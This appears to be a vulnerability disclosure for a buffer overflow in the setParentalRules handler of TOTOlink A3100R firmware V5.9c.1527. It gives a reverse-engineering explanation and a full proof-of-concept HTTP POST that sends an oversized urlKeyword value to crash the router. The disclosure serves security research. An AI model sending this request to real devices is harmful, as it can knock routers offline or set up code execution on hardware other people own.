# TARGET
TOTOlink A3100R
V5.9c.1527
# BUG TYPE
buffer overflow
# Abstract
The TOTOlink A3100R router device contains a buffer overflow vulnerability in its firmware version V5.9c.1527. The vulnerability arises from the improper input validation of the `urlKeyword` parameter in the `setParentalRules` interface of `/lib/cste_modules/firewall.so`. A remote attacker could exploit this flaw to execute arbitrary code on the system or cause a denial of service.
# Details
`/squashfs-root//lib/cste_modules/firewall.so`
![](https://github.com/SunnyYANGyaya/cuicuishark-sheep-fishIOT/blob/main/ToTolink/A3100R-3/setParentalRules%20urlKeyword.png)

By analyzing the `setParentalRules` function in `/lib/cste_modules/firewall.so` using IDA, we find that the entry address of the function is `0x00007AC0`. It is evident that the `v9` variable is passed to `v17` via `sprintf` without any filtering or length checks. Through further analysis, it is clear that the controllable `urlKeyword` parameter can lead to a buffer overflow vulnerability. The function `sub_7ac0` reads the user-provided "`urlKeyword`" data, and `sprintf` copies the string pointed to by `v9` to `v17` without verifying whether `v17` has enough space to store the copied string. If the string pointed to by `v9` exceeds the size of the `v17` buffer, it can cause a buffer overflow, potentially overwriting adjacent memory regions and leading to undefined behavior. This may result in program crashes or, if exploited by an attacker, further compromise the system.

![](https://github.com/SunnyYANGyaya/cuicuishark-sheep-fishIOT/blob/main/ToTolink/A3100R-3/setParentalRules%20urlKeyword%20attack%20effect.png)
An attacker can exploit the buffer overflow vulnerability by sending an API request, using a malicious configuration file, or crafting a specially crafted HTTP request with an excessively long `urlKeyword` string, potentially causing the program to crash.


# POC

```
POST /cgi-bin/cstecgi.cgi HTTP/1.1
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Accept: */*
X-Requested-With: XMLHttpRequest
Referer: http://192.168.0.1/firewall/parental_rules.asp?timestamp=1743754018048
Accept-Language: zh-Hans-CN,zh-Hans;q=0.8,en-US;q=0.6,en;q=0.4,ja;q=0.2
Accept-Encoding: gzip, deflate, br
User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 10.0; WOW64; Trident/7.0; .NET4.0C; .NET4.0E)
Host: 192.168.0.1
Content-Length: 955
Connection: keep-alive
Cache-Control: no-cache
Cookie: SESSION_ID=2:1743753808:2

{"topicurl":"setting/setParentalRules","addEffect":"0","urlKeyword":"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"}
```
